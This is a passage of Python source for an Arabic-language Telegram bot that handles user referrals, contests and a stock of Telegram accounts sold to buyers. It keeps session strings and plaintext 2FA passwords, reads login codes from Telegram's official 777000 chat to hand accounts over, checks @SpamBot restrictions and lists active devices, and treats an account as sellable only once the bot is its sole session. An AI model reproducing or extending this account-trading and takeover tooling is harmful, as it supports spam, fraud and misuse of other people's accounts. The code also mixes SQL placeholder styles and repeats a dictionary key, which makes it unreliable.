    with db_conn() as c:
        row = c.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
        if row:
            c.execute("UPDATE users SET username=?, full_name=? WHERE user_id=?",
                      (username, full_name, user_id))
            return dict(row)
        # إصلاح race condition: نستخدم UPDATE RETURNING ذري داخل نفس المعاملة
        # بدلاً من get_setting/set_setting اللتين تفتحان معاملتين منفصلتين
        # مما كان يتسبب في تكرار bot_user_num عند تسجيل مستخدمين في نفس اللحظة
        num_row = c.execute(
            "UPDATE settings SET value=(value::int+1)::text WHERE key='total_bot_users' RETURNING value::int AS total"
        ).fetchone()
        total = num_row["total"] if num_row else 1
        c.execute(
            "INSERT INTO users (user_id, username, full_name, invited_by, bot_user_num, verified) VALUES (%s,%s,%s,%s,%s,0)",
            (user_id, username, full_name, invited_by, total)
        )
        # ملاحظة: لا نمنح نقاط الإحالة هنا — تُمنح فقط بعد اشتراك المستخدم الجديد
        # بالقنوات الإجبارية واجتيازه للتحقق (انظر credit_referral_if_pending)
        return dict(c.execute("SELECT * FROM users WHERE user_id=%s", (user_id,)).fetchone())

def set_user_verified(user_id: int):
    with db_conn() as c:
        c.execute("UPDATE users SET verified=1 WHERE user_id=?", (user_id,))

def credit_referral_if_pending(user_id: int, context=None):
    """يمنح نقاط الإحالة للداعي مرة واحدة فقط، بعد اشتراك المدعو بالقنوات الإجبارية واجتيازه التحقق.
    يُعيد (inviter_id, points) عند المنح، أو None إن لم يكن هناك شيء لمنحه."""
    with db_conn() as c:
        row = c.execute(
            "SELECT invited_by, referral_credited FROM users WHERE user_id=%s", (user_id,)
        ).fetchone()
        if not row:
            return None
        invited_by = row["invited_by"]
        already = row["referral_credited"]
        if not invited_by or invited_by == 0 or invited_by == user_id or already:
            return None
        rp = int(get_setting("referral_points") or "30")
        # تحديث ذري يمنع منح النقاط أكثر من مرة عند أي تسابق محتمل
        c.execute(
            "UPDATE users SET referral_credited=1, credited_at=NOW() WHERE user_id=%s AND referral_credited=0",
            (user_id,)
        )
        if c.rowcount == 0:
            return None
        c.execute("UPDATE users SET points=points+%s WHERE user_id=%s", (rp, invited_by))
    # ── كشف رشق الإحالات: 5 في 5 ثوانٍ → تقييد ──
    import time as _time_mod
    _now_ts = _time_mod.time()
    _bucket = _referral_rate_tracker.setdefault(invited_by, [])
    _bucket.append(_now_ts)
    _referral_rate_tracker[invited_by] = [t for t in _bucket if _now_ts - t <= 5]
    if len(_referral_rate_tracker[invited_by]) >= 5 and context is not None:
        with db_conn() as _rc:
            _rc.execute("UPDATE users SET referral_points_blocked=1 WHERE user_id=%s", (invited_by,))
        _referral_rate_tracker.pop(invited_by, None)
        _bot2 = getattr(context, 'bot', None)
        if _bot2 and OWNER_ID:
            _rq = get_user(invited_by) or {}
            _rq_name = _rq.get('full_name') or f"ID:{invited_by}"
            _rq_un = (f" (@{_rq['username']})" if _rq.get('username') else '')
            _fraud_text = (
                f"\u26a0\ufe0f *\u062a\u0646\u0628\u064a\u0647: \u0631\u0634\u0642 \u0625\u062d\u0627\u0644\u0627\u062a \u0645\u062d\u062a\u0645\u0644!*\n\n"
                f"\U0001f464 \u0627\u0644\u0645\u064f\u062d\u064a\u0644: {_rq_name}{_rq_un} (`{invited_by}`)\n"
                f"\U0001f4ca \u062a\u0644\u0642\u0651\u0649 5+ \u0625\u062d\u0627\u0644\u0627\u062a \u0641\u064a \u0623\u0642\u0644 \u0645\u0646 5 \u062b\u0648\u0627\u0646\u0650\n"
                f"\U0001f4b0 \u0646\u0642\u0627\u0637 \u0622\u062e\u0631 \u0625\u062d\u0627\u0644\u0629: {rp} \u0646\u0642\u0637\u0629\n"
                f"\U0001f512 \u062a\u0645 \u062a\u0642\u064a\u064a\u062f\u0647 \u062a\u0644\u0642\u0627\u0626\u064a\u0627\u064b\n\n"
                f"\u0627\u062e\u062a\u0631 \u0627\u0644\u0625\u062c\u0631\u0627\u0621:"
            )
            _fraud_kb = InlineKeyboardMarkup([
                [InlineKeyboardButton("\u2705 \u0625\u0628\u0642\u0627\u0621 + \u0631\u0641\u0639 \u0627\u0644\u062a\u0642\u064a\u064a\u062f",   callback_data=f"os:ref_keep:{invited_by}:{rp}")],
                [InlineKeyboardButton("\u274c \u062e\u0635\u0645 \u0627\u0644\u0625\u062d\u0627\u0644\u0629 + \u0631\u0641\u0639 \u0627\u0644\u062a\u0642\u064a\u064a\u062f", callback_data=f"os:ref_deduct:{invited_by}:{rp}")],
                [InlineKeyboardButton("\u2795 \u062e\u0635\u0645 \u0646\u0642\u0627\u0637 \u0625\u0636\u0627\u0641\u064a\u0629",               callback_data=f"os:ref_extra:{invited_by}:{rp}")],
                [InlineKeyboardButton("\U0001f513 \u0631\u0641\u0639 \u0627\u0644\u062a\u0642\u064a\u064a\u062f \u0641\u0642\u0637",            callback_data=f"os:ref_unblock:{invited_by}")],
            ])
            import asyncio as _aio
            try:
                _aio.ensure_future(_bot2.send_message(OWNER_ID, _fraud_text, parse_mode='Markdown', reply_markup=_fraud_kb))
            except Exception:
                pass
    return (invited_by, rp)


def _referral_counter_reset_at():
    """يُرجع لحظة آخر تصفير للعداد (UTC) إن وُجدت، وإلا None."""
    raw = get_setting("referral_counter_reset_at")
    if not raw:
        return None
    try:
        dt = datetime.fromisoformat(raw)
        if dt.tzinfo is None:
            dt = dt.replace(tzinfo=timezone.utc)
        return dt
    except Exception:
        return None


def reset_referral_counter():
    """يصفّر عداد 'الأكثر إرسالاً لرابط الدعوة' من الآن، دون المساس بنقاط
    الأعضاء أو حالة الدعوات الفعلية — فقط يستثني ما قبل هذه اللحظة من العدّ."""
    set_setting("referral_counter_reset_at", datetime.now(timezone.utc).isoformat())


def _referral_period_bounds(period: str):
    """يُرجع (since_utc, عنوان الفترة) لفترة زمنية معيّنة، محسوبة بالتوقيت العالمي (UTC)،
    مع مراعاة آخر عملية تصفير للعداد إن وُجدت (يُؤخذ الأحدث بين الاثنين)."""
    now = datetime.now(timezone.utc)
    if period == "24h":
        since, title = now - timedelta(hours=24), "آخر 24 ساعة"
    elif period == "day":
        since, title = now.replace(hour=0, minute=0, second=0, microsecond=0), "اليوم (منذ 00:00 بالتوقيت العالمي)"
    elif period == "week":
        since, title = now - timedelta(days=7), "آخر أسبوع"
    elif period == "month":
        since, title = now - timedelta(days=30), "آخر شهر"
    else:
        since, title = None, "كل الأوقات"
    reset_at = _referral_counter_reset_at()
    if reset_at is not None and (since is None or reset_at > since):
        since = reset_at
    return since, title


def get_top_referrers_since(since_dt, limit: int = 10):
    """يُرجع قائمة أكثر الأعضاء إرسالاً لرابط الدعوة (دعوات مكتملة/معتمدة فقط)
    منذ لحظة زمنية محدّدة (UTC)، أو لكل الأوقات إن كانت since_dt=None."""
    with db_conn() as c:
        if since_dt is None:
            rows = c.execute(
                "SELECT invited_by, COUNT(*) as cnt FROM users "
                "WHERE invited_by IS NOT NULL AND invited_by != 0 AND referral_credited=1 "
                "GROUP BY invited_by ORDER BY cnt DESC LIMIT %s",
                (limit,)
            ).fetchall()
        else:
            rows = c.execute(
                "SELECT invited_by, COUNT(*) as cnt FROM users "
                "WHERE invited_by IS NOT NULL AND invited_by != 0 AND referral_credited=1 "
                "AND credited_at IS NOT NULL AND credited_at >= %s "
                "GROUP BY invited_by ORDER BY cnt DESC LIMIT %s",
                (since_dt, limit)
            ).fetchall()
    return rows


def _format_top_referrers(rows, title: str) -> str:
    lines = [f"🏆 *الأكثر إرسالاً لرابط الدعوة — {title}:*\n"]
    if not rows:
        lines.append("لا توجد دعوات مكتملة خلال هذه الفترة.")
        return "\n".join(lines)
    for i, r in enumerate(rows, start=1):
        inviter = get_user(r["invited_by"])
        if inviter and inviter.get("username"):
            name = md_escape(f"@{inviter['username']}")
        elif inviter and inviter.get("full_name"):
            name = md_escape(inviter["full_name"])
        else:
            name = f"ID {r['invited_by']}"
        lines.append(f"{i}. {name} — {r['cnt']} دعوة")
    return "\n".join(lines)



# ────────────────────────────────────────────────────────────
#  مسابقة رابط الدعوة — دوال مساعدة
# ────────────────────────────────────────────────────────────

def get_referral_contest() -> dict:
    """يُرجع معلومات المسابقة الحالية من قاعدة الإعدادات."""
    ctype     = get_setting("referral_contest_type")  or "none"
    start_raw = get_setting("referral_contest_start") or ""
    end_raw   = get_setting("referral_contest_end")   or ""
    start_dt = end_dt = None
    try:
        if start_raw:
            start_dt = datetime.fromisoformat(start_raw)
            if start_dt.tzinfo is None:
                start_dt = start_dt.replace(tzinfo=timezone.utc)
    except Exception:
        pass
    try:
        if end_raw:
            end_dt = datetime.fromisoformat(end_raw)
            if end_dt.tzinfo is None:
                end_dt = end_dt.replace(tzinfo=timezone.utc)
    except Exception:
        pass
    return {"type": ctype, "start": start_dt, "end": end_dt}


def _parse_contest_duration(text: str):
    """يُحوّل نصاً مثل 7s / 7m / 7h / 7d إلى timedelta، أو None إن كانت الصيغة خاطئة."""
    m = re.match(r"^(\d+)([smhd])$", text.strip().lower())
    if not m:
        return None
    val, unit = int(m.group(1)), m.group(2)
    if unit == "s": return timedelta(seconds=val)
    if unit == "m": return timedelta(minutes=val)
    if unit == "h": return timedelta(hours=val)
    if unit == "d": return timedelta(days=val)
    return None


def _format_contest_time_remaining(end_dt) -> str:
    """يُرجع نص الوقت المتبقي بصيغة مقروءة بالعربية."""
    now = datetime.now(timezone.utc)
    if end_dt is None or end_dt <= now:
        return "انتهت المسابقة"
    total_seconds = int((end_dt - now).total_seconds())
    days    = total_seconds // 86400
    hours   = (total_seconds % 86400) // 3600
    minutes = (total_seconds % 3600)  // 60
    seconds = total_seconds % 60
    parts = []
    if days:              parts.append(f"{days} يوم")
    if hours:             parts.append(f"{hours} ساعة")
    if minutes:           parts.append(f"{minutes} دقيقة")
    if seconds and not days: parts.append(f"{seconds} ثانية")
    return " و ".join(parts) if parts else "أقل من ثانية"

def add_numbers_to_stock(numbers: list) -> int:
    """يضيف أرقاماً جديدة لمخزون أرقام تيلغرام (يتجاهل المكرر). يُرجع عدد الأرقام المضافة فعلياً."""
    added = 0
    with db_conn() as c:
        for n in numbers:
            n = n.strip()
            if not n:
                continue
            try:
                c.execute(
                    "INSERT INTO number_stock (phone_number) VALUES (%s) ON CONFLICT (phone_number) DO NOTHING",
                    (n,)
                )
                if c.rowcount:
                    added += 1
            except Exception:
                pass
    return added


COUNTRY_CODES = {
    "1": "🇺🇸 أمريكا/كندا", "7": "🇷🇺 روسيا", "20": "🇪🇬 مصر", "27": "🇿🇦 جنوب أفريقيا",
    "30": "🇬🇷 اليونان", "31": "🇳🇱 هولندا", "32": "🇧🇪 بلجيكا", "33": "🇫🇷 فرنسا",
    "34": "🇪🇸 إسبانيا", "36": "🇭🇺 المجر", "39": "🇮🇹 إيطاليا", "40": "🇷🇴 رومانيا",
    "44": "🇬🇧 بريطانيا", "45": "🇩🇰 الدنمارك", "46": "🇸🇪 السويد", "48": "🇵🇱 بولندا",
    "49": "🇩🇪 ألمانيا", "51": "🇵🇪 بيرو", "52": "🇲🇽 المكسيك", "54": "🇦🇷 الأرجنتين",
    "55": "🇧🇷 البرازيل", "56": "🇨🇱 تشيلي", "60": "🇲🇾 ماليزيا", "62": "🇮🇩 إندونيسيا",
    "63": "🇵🇭 الفلبين", "64": "🇳🇿 نيوزيلندا", "65": "🇸🇬 سنغافورة", "66": "🇹🇭 تايلاند",
    "81": "🇯🇵 اليابان", "82": "🇰🇷 كوريا الجنوبية", "84": "🇻🇳 فيتنام", "86": "🇨🇳 الصين",
    "90": "🇹🇷 تركيا", "91": "🇮🇳 الهند", "92": "🇵🇰 باكستان", "93": "🇦🇫 أفغانستان",
    "94": "🇱🇰 سريلانكا", "95": "🇲🇲 ميانمار", "98": "🇮🇷 إيران",
    "212": "🇲🇦 المغرب", "213": "🇩🇿 الجزائر", "216": "🇹🇳 تونس", "218": "🇱🇾 ليبيا",
    "220": "🇬🇲 غامبيا", "221": "🇸🇳 السنغال", "234": "🇳🇬 نيجيريا", "249": "🇸🇩 السودان",
    "251": "🇪🇹 إثيوبيا", "254": "🇰🇪 كينيا", "255": "🇹🇿 تنزانيا", "256": "🇺🇬 أوغندا",
    "260": "🇿🇲 زامبيا", "351": "🇵🇹 البرتغال", "355": "🇦🇱 ألبانيا", "358": "🇫🇮 فنلندا",
    "370": "🇱🇹 ليتوانيا", "371": "🇱🇻 لاتفيا", "372": "🇪🇪 إستونيا", "373": "🇲🇩 مولدوفا",
    "374": "🇦🇲 أرمينيا", "375": "🇧🇾 بيلاروسيا", "376": "🇦🇩 أندورا", "380": "🇺🇦 أوكرانيا",
    "381": "🇷🇸 صربيا", "385": "🇭🇷 كرواتيا", "386": "🇸🇮 سلوفينيا", "420": "🇨🇿 التشيك",
    "421": "🇸🇰 سلوفاكيا", "212": "🇲🇦 المغرب",
    "852": "🇭🇰 هونغ كونغ", "855": "🇰🇭 كمبوديا", "880": "🇧🇩 بنغلاديش", "886": "🇹🇼 تايوان",
    "960": "🇲🇻 المالديف", "961": "🇱🇧 لبنان", "962": "🇯🇴 الأردن", "963": "🇸🇾 سوريا",
    "964": "🇮🇶 العراق", "965": "🇰🇼 الكويت", "966": "🇸🇦 السعودية", "967": "🇾🇪 اليمن",
    "968": "🇴🇲 عمان", "970": "🇵🇸 فلسطين", "971": "🇦🇪 الإمارات", "972": "🇮🇱 إسرائيل",
    "973": "🇧🇭 البحرين", "974": "🇶🇦 قطر", "975": "🇧🇹 بوتان", "976": "🇲🇳 منغوليا",
    "992": "🇹🇯 طاجيكستان", "993": "🇹🇲 تركمانستان", "994": "🇦🇿 أذربيجان", "995": "🇬🇪 جورجيا",
    "996": "🇰🇬 قيرغيزستان", "998": "🇺🇿 أوزبكستان",
}
_COUNTRY_PREFIXES_SORTED = sorted(COUNTRY_CODES.keys(), key=len, reverse=True)


def guess_country(phone: str) -> str:
    """يحاول تحديد الدولة من مقدمة رقم الهاتف الدولي (+964...)."""
    digits = phone.lstrip("+").strip()
    for prefix in _COUNTRY_PREFIXES_SORTED:
        if digits.startswith(prefix):
            return COUNTRY_CODES[prefix]
    return "🌍 غير معروفة"


# جداول تقريبية للربط بين رقم حساب تيليجرام (ID) وسنة إنشائه تقريباً (بيانات عامة تقريبية وليست رسمية)
_ID_AGE_TABLE = [
    (100_000_000, "2013 أو قبل"),
    (200_000_000, "2014"),
    (300_000_000, "2015"),
    (400_000_000, "2016"),
    (600_000_000, "2017"),
    (900_000_000, "2018"),
    (1_100_000_000, "2019"),
    (1_400_000_000, "2020"),
    (1_700_000_000, "2021"),
    (2_000_000_000, "2022"),
    (5_000_000_000, "2023"),
    (6_500_000_000, "2024"),
    (7_500_000_000, "2025"),
]


def estimate_registration_year(user_id: int) -> str:
    """تقدير تقريبي (غير رسمي) لسنة إنشاء الحساب اعتماداً على رقم الـID، لأن تيليجرام لا يوفر تاريخ إنشاء دقيق."""
    for threshold, year in _ID_AGE_TABLE:
        if user_id < threshold:
            return year
    return "2026 أو أحدث"


def parse_spam_reply(raw_text: str) -> dict:
    """يحلّل رد @SpamBot الرسمي ليستخرج: هل هناك تقييد حالياً، وحتى أي وقت/تاريخ ينتهي (إن ذُكر صريحاً)."""
    text = (raw_text or "").strip()
    result = {"restricted": None, "until": None, "raw": text}
    if not text:
        return result
    lower = text.lower()
    if any(k in lower for k in ("good news", "no limits", "free as a bird", "لا يوجد", "no restrictions")):
        result["restricted"] = False
        return result
    result["restricted"] = True
    # محاولة استخراج تاريخ/وقت انتهاء القيد الصريح من نص الرد (الصيغ الشائعة من SpamBot الرسمي)
    patterns = [
        r"until\s+([0-9]{1,2}[:.][0-9]{2}(?:\s*(?:UTC|GMT))?[^.\n]{0,40})",
        r"until\s+([A-Za-z0-9,\s\-\/]{4,40}?(?:UTC|GMT|\d{4}))",
        r"limited for\s+([A-Za-z0-9\s]{2,30})",
    ]
    for p in patterns:
        m = re.search(p, text, re.IGNORECASE)
        if m:
            result["until"] = m.group(1).strip().rstrip(". ")
            break
    return result


async def check_spam_status(client: TelegramClient) -> str:
    """يفحص حالة الحظر/التقييد عبر إرسال رسالة تلقائية لبوت @SpamBot الرسمي وقراءة رده.
    للحصول على تفاصيل منفصلة (مقيّد أم لا، ومتى ينتهي)، استخدم check_spam_status_detailed."""
    detail = await check_spam_status_detailed(client)
    return detail["display"]


async def check_spam_status_detailed(client: TelegramClient) -> dict:
    """نسخة تفصيلية من فحص @SpamBot: تُرجع dict فيه restricted (True/False/None) و until (نص وقت الانتهاء إن وُجد)
    والنص الكامل الأصلي، بالإضافة إلى نص عرض جاهز display."""
    try:
        await client.send_message("SpamBot", "/start")
        await asyncio.sleep(3)
        msgs = await client.get_messages("SpamBot", limit=1)
        if not msgs or not msgs[0].message:
            return {"restricted": None, "until": None, "raw": None,
                     "display": "⚠️ لم يصل رد من SpamBot، حاول مجدداً"}
        parsed = parse_spam_reply(msgs[0].message)
        if parsed["restricted"] is False:
            parsed["display"] = "✅ غير مقيّد (حساب سليم)"
        elif parsed["restricted"] is True:
            if parsed["until"]:
                parsed["display"] = f"🚫 مقيّد من الإرسال — ينتهي القيد: {parsed['until']}"
            else:
                parsed["display"] = f"🚫 مقيّد من الإرسال (لم يُذكر وقت انتهاء صريح):\n{msgs[0].message[:300]}"
        else:
            parsed["display"] = f"ℹ️ رد SpamBot غير واضح:\n{msgs[0].message[:300]}"
        return parsed
    except Exception as e:
        logger.error(f"❌ خطأ في فحص SpamBot: {e}")
        return {"restricted": None, "until": None, "raw": None,
                "display": "⚠️ تعذر الفحص حالياً، حاول لاحقاً"}


async def get_device_count(client: TelegramClient) -> int:
    """يُرجع عدد الأجهزة/الجلسات النشطة المسجّلة دخول على هذا الحساب."""
    try:
        result = await client(GetAuthorizationsRequest())
        return len(result.authorizations)
    except Exception as e:
        logger.error(f"❌ خطأ في جلب عدد الأجهزة: {e}")
        return -1


async def get_authorizations_detail(client: TelegramClient) -> list:
    """يُرجع قائمة تفصيلية بكل الأجهزة: الاسم، تاريخ التسجيل، آخر نشاط، هل هو الجهاز الحالي."""
    try:
        result = await client(GetAuthorizationsRequest())
        devices = []
        for auth in result.authorizations:
            devices.append({
                "hash":         auth.hash,
                "current":      auth.current,
                "device":       auth.device_model or "غير معروف",
                "app":          auth.app_name or "غير معروف",
                "platform":     auth.platform or "",
                "country":      auth.country or "",
                "date_created": auth.date_created,
                "date_active":  auth.date_active,
            })
        return devices
    except Exception as e:
        logger.error(f"❌ خطأ في جلب تفاصيل الأجهزة: {e}")
        return []


async def check_account_frozen(client: TelegramClient, stock_id: int | None = None) -> tuple:
    """
    يفحص إذا كان الحساب مجمّداً/محذوفاً.
    يحفظ تاريخ أول اكتشاف للتجميد في قاعدة البيانات (frozen_at).
    يُرجع (is_frozen: bool, status_text: str, frozen_at_str: str | None).
    """
    is_frozen = False
    status_text = "🟢 نشط"
    frozen_at_str = None
    try:
        me = await client.get_me()
        if me is None or getattr(me, "deleted", False):
            is_frozen = True
            status_text = "🔴 جامد / حساب محذوف"
    except Exception as e:
        err = str(e).lower()
        if any(k in err for k in ("auth_key_unregistered", "user_deactivated", "session_revoked", "deactivated_ban")):
            is_frozen = True
            status_text = "🔴 جامد (جلسة ألغيت أو حساب محظور)"
        else:
            status_text = f"⚠️ تعذّر الفحص: {e}"

    if is_frozen and stock_id is not None:
        # حفظ تاريخ التجميد إن لم يكن محفوظاً من قبل
        try:
            with db_conn() as c:
                row = c.execute(
                    "SELECT frozen_at FROM number_stock WHERE id=%s", (stock_id,)
                ).fetchone()
                if row:
                    if row["frozen_at"] is None:
                        c.execute(
                            "UPDATE number_stock SET frozen_at=NOW() WHERE id=%s", (stock_id,)
                        )
                        frozen_at_str = "الآن (تم اكتشافه للتو)"
                    else:
                        fa = row["frozen_at"]
                        if hasattr(fa, "strftime"):
                            frozen_at_str = fa.strftime("%Y-%m-%d %H:%M UTC")
                        else:
                            frozen_at_str = str(fa)
        except Exception as db_err:
            logger.error(f"❌ خطأ في حفظ frozen_at: {db_err}")

    return is_frozen, status_text, frozen_at_str


async def _fetch_code_for_delivery(session_str: str) -> str | None:
    """يحاول جلب آخر كود تحقق من رسائل 777000 عبر الجلسة — للإرسال الفوري عند التسليم."""
    if not (session_str and TELEGRAM_API_ID and TELEGRAM_API_HASH):
        return None
    cli = None
    try:
        cli = TelegramClient(StringSession(session_str), int(TELEGRAM_API_ID), TELEGRAM_API_HASH)
        await asyncio.wait_for(cli.connect(), timeout=15)
        if not await asyncio.wait_for(cli.is_user_authorized(), timeout=8):
            return None
        raw, _raw_date = await fetch_last_login_code(cli, after_date=None)
        if raw:
            m = re.search(r'(\d{4,7})', raw)
            if m:
                return m.group(1)
    except Exception:
        pass
    finally:
        try:
            if cli: await cli.disconnect()
        except Exception:
            pass
    return None


async def fetch_last_login_code(client: TelegramClient, after_date=None):
    """يجلب آخر رسالة كود تفعيل وصلت من حساب تيليجرام الرسمي (777000) لهذا الرقم.
    إذا أُعطي after_date، يُرجع فقط الأكواد التي وصلت بعد هذا التاريخ.
    يُرجع tuple (نص_الرسالة, تاريخ_الرسالة) أو (None, None) إن لم يوجد."""
    import datetime as _dt
    try:
        msgs = await client.get_messages(777000, limit=10)
        for m in msgs:
            if not m.message or not any(ch.isdigit() for ch in m.message):
                continue
            if after_date is not None:
                msg_date = m.date
                if msg_date.tzinfo is None:
                    msg_date = msg_date.replace(tzinfo=_dt.timezone.utc)
                after = after_date
                if after.tzinfo is None:
                    after = after.replace(tzinfo=_dt.timezone.utc)
                # هامش 10 دقائق: نقبل أي كود وصل قبل 10 دقائق من لحظة الشراء أو بعدها
                threshold = after - _dt.timedelta(minutes=10)
                if msg_date < threshold:
                    continue  # كود قديم جداً — تخطَّه
            return m.message, m.date
        return None, None
    except Exception as e:
        logger.error(f"❌ خطأ في جلب كود الدخول: {e}")
        return None, None


def list_stock_numbers(filter_type: str = "all"):
    """أرقام المخزون غير المباعة، مع تصنيف اختياري:
    - "all": كل الأرقام غير المباعة (المعروضة + المنتظرة)، بدون المحذوفة ولا المبيوعة.
    - "listed": المعروضة للبيع فعلاً (تُسلَّم فوراً عند الشراء).
    - "pending": بانتظار طرد الجلسات الأخرى قبل أن تصبح قابلة للبيع.
    - "kicked": الأرقام المطرودة (فُصلت جلستها من تيليجرام) وما زالت غير محذوفة.
    - "trash": الأرقام المحذوفة (سلة المهملات)، بغض النظر عن حالة البيع.
    الأرقام المبيوعة (ever_sold=TRUE) تُستثنى من جميع القوائم — تظهر فقط في صفحة الحسابات المبيوعة.
    """
    if filter_type == "trash":
        sql = "SELECT id, phone_number, session_string, sessions_reset, force_listed, deleted_at, added_at FROM number_stock WHERE deleted_at IS NOT NULL"
    elif filter_type == "kicked":
        sql = (
            "SELECT id, phone_number, session_string, sessions_reset, force_listed, kicked_at, added_at "
            "FROM number_stock WHERE assigned_to IS NULL AND deleted_at IS NULL AND last_authorized=FALSE AND ever_sold IS NOT TRUE"
        )
    elif filter_type == "frozen":
        sql = (
            "SELECT id, phone_number, session_string, frozen_at, added_at "
            "FROM number_stock WHERE frozen_at IS NOT NULL AND deleted_at IS NULL AND ever_sold IS NOT TRUE"
        )
    elif filter_type == "auto_2fa":
        sql = (
            "SELECT id, phone_number, session_string, twofa_password, added_at "
            "FROM number_stock WHERE auto_2fa_enabled=TRUE AND deleted_at IS NULL AND ever_sold IS NOT TRUE"
        )
    else:
        sql = "SELECT id, phone_number, session_string, sessions_reset, force_listed, twofa_password, last_authorized, frozen_at, added_at FROM number_stock WHERE assigned_to IS NULL AND deleted_at IS NULL AND ever_sold IS NOT TRUE"
        if filter_type == "listed":
            sql += f" AND {_sellable_filter_sql()}"
        elif filter_type == "pending":
            sql += f" AND NOT ({_sellable_filter_sql()})"
    sql += " ORDER BY kicked_at DESC NULLS LAST, id ASC" if filter_type == "kicked" else " ORDER BY id ASC"
    with db_conn() as c:
        rows = c.execute(sql).fetchall()
        return [dict(r) for r in rows]


def get_number_counts() -> dict:
    """يحسب عدد كل تصنيف من أرقام المخزون (غير المباعة وغير المحذوفة وغير المبيوعة)، دفعة واحدة."""
    with db_conn() as c:
        row = c.execute(
            "SELECT "
            "COUNT(*) AS total, "
            f"COUNT(*) FILTER (WHERE {_sellable_filter_sql()}) AS listed, "
            "COUNT(*) FILTER (WHERE last_authorized=FALSE) AS kicked, "
            "COUNT(*) FILTER (WHERE frozen_at IS NOT NULL) AS frozen, "
            "COUNT(*) FILTER (WHERE auto_2fa_enabled=TRUE) AS auto_2fa "
            "FROM number_stock WHERE assigned_to IS NULL AND deleted_at IS NULL AND ever_sold IS NOT TRUE"
        ).fetchone()
        total = row["total"] if row else 0
        listed = row["listed"] if row else 0
        kicked = row["kicked"] if row else 0
        frozen = row["frozen"] if row else 0
        with db_conn() as c2:
            trow = c2.execute("SELECT COUNT(*) AS cnt FROM number_stock WHERE deleted_at IS NOT NULL").fetchone()
            trash = trow["cnt"] if trow else 0
            srow = c2.execute("SELECT COUNT(*) AS cnt FROM number_stock WHERE ever_sold IS TRUE AND deleted_at IS NULL").fetchone()
            sold = srow["cnt"] if srow else 0
        auto_2fa = row["auto_2fa"] if row else 0
        return {"all": total, "listed": listed, "pending": total - listed, "kicked": kicked, "trash": trash, "frozen": frozen, "auto_2fa": auto_2fa, "sold": sold}


def get_stock_number(stock_id: int):
    with db_conn() as c:
        row = c.execute(
            "SELECT id, phone_number, session_string, assigned_to, sessions_reset, force_listed, frozen_at, "
            "twofa_password, deleted_at, last_authorized "
            "FROM number_stock WHERE id=%s",
            (stock_id,)
        ).fetchone()
        return dict(row) if row else None


def soft_delete_number(stock_id: int) -> bool:
    """ينقل رقماً إلى سلة المهملات (حذف مؤقت) بدل حذفه نهائياً."""
    with db_conn() as c:
        c.execute("UPDATE number_stock SET deleted_at=NOW() WHERE id=%s", (stock_id,))
        return True


def restore_deleted_number(stock_id: int) -> bool:
    """يستعيد رقماً من سلة المهملات."""
    with db_conn() as c:
        c.execute("UPDATE number_stock SET deleted_at=NULL WHERE id=%s", (stock_id,))
        return True


def permanently_delete_number(stock_id: int) -> bool:
    """يحذف رقماً نهائياً من قاعدة البيانات (لا يمكن التراجع بعده)."""
    with db_conn() as c:
        c.execute("DELETE FROM number_stock WHERE id=%s", (stock_id,))
        return True


def set_force_listed(stock_id: int) -> bool:
    with db_conn() as c:
        c.execute("UPDATE number_stock SET force_listed=TRUE WHERE id=%s", (stock_id,))
        return True


def _sellable_filter_sql() -> str:
    """رقم يُعتبر قابلاً للبيع فقط إذا اكتملت جميع شروط الجاهزية الثلاثة:
    ① البوت هو الجلسة الوحيدة   (is_solo IS TRUE)
    ② البوت يعرف كلمة 2FA        (twofa_password IS NOT NULL)
    ③ البوت يستطيع إرسال كود     (can_send_code IS TRUE)
    بالإضافة إلى:
    - جلسة نشطة صالحة (last_authorized IS NOT FALSE)
    - غير مجمّد
    - لم يُباع سابقاً أبداً (ever_sold IS NOT TRUE) — حظر نهائي لا استثناء فيه
    الحسابات المبيوعة سابقاً تظهر فقط في صفحة الحسابات المبيوعة ولا تُعرض للبيع مجدداً."""
    return (
        "session_string IS NOT NULL"
        " AND last_authorized IS NOT FALSE"
        " AND twofa_password IS NOT NULL"
        " AND twofa_password <> ''"
        " AND frozen_at IS NULL"
        " AND ever_sold IS NOT TRUE"
        " AND is_solo IS TRUE"
        " AND can_send_code IS TRUE"
    )


def get_available_number_count() -> int:
    with db_conn() as c:
        row = c.execute(
            f"SELECT COUNT(*) as cnt FROM number_stock WHERE assigned_to IS NULL AND deleted_at IS NULL AND {_sellable_filter_sql()}"
        ).fetchone()
        return row["cnt"] if row else 0


async def _test_and_set_can_send_code(phone: str, session_str: str, stock_id: int):
    """يتحقق من قدرة البوت على الوصول للحساب وجلب الكودات:
    يتصل بالجلسة المحفوظة، يستدعي get_me()، وإذا أرجعت بيانات مستخدم صحيحة
    يضبط can_send_code=TRUE — يعني البوت يستطيع إرسال كود للمشتري عند الطلب."""
    if not (TELEGRAM_API_ID and TELEGRAM_API_HASH):
        return
    try:
        _cli = TelegramClient(StringSession(session_str), int(TELEGRAM_API_ID), TELEGRAM_API_HASH)
        await asyncio.wait_for(_cli.connect(), timeout=15)
        try:
            if await asyncio.wait_for(_cli.is_user_authorized(), timeout=8):
                me = await asyncio.wait_for(_cli.get_me(), timeout=10)
                if me and me.phone:
                    with db_conn() as _c:
                        _c.execute(
                            "UPDATE number_stock SET can_send_code=TRUE WHERE id=%s AND ever_sold IS NOT TRUE",
                            (stock_id,)
                        )
                    logger.info(f"✅ can_send_code=TRUE للرقم {phone} (الحساب جاهز للبيع إذا اكتملت باقي الشروط)")
                else:
                    logger.warning(f"⚠️ can_send_code: get_me() لم يُرجع رقم هاتف للحساب {phone}")
            else:
                logger.warning(f"⚠️ can_send_code: جلسة {phone} غير مصرَّح بها")
        finally:
            try:
                await _cli.disconnect()
            except Exception:
                pass
    except Exception as _e:
        logger.debug(f"⚠️ _test_and_set_can_send_code {phone}: {_e}")


async def _ensure_can_send_code(phone: str, session_str: str, stock_id: int):
    """يُستدعى عندما يصبح البوت الجلسة الوحيدة — يتحقق ويضبط can_send_code إذا لم يكن مضبوطاً بعد.
    يتجاهل الحسابات المبيوعة سابقاً أو التي جُرِّب كودها مسبقاً."""
    try:
        with db_conn() as _ec:
            _row = _ec.execute(
                "SELECT ever_sold, can_send_code FROM number_stock WHERE id=%s", (stock_id,)
            ).fetchone()
        if not _row or _row["ever_sold"] or _row["can_send_code"]:
            return  # مباع سابقاً أو مضبوط مسبقاً — لا حاجة للفحص
        await _test_and_set_can_send_code(phone, session_str, stock_id)
    except Exception as _e:
        logger.debug(f"⚠️ _ensure_can_send_code {phone}: {_e}")


def add_number_with_session(phone: str, session_str: str) -> bool:
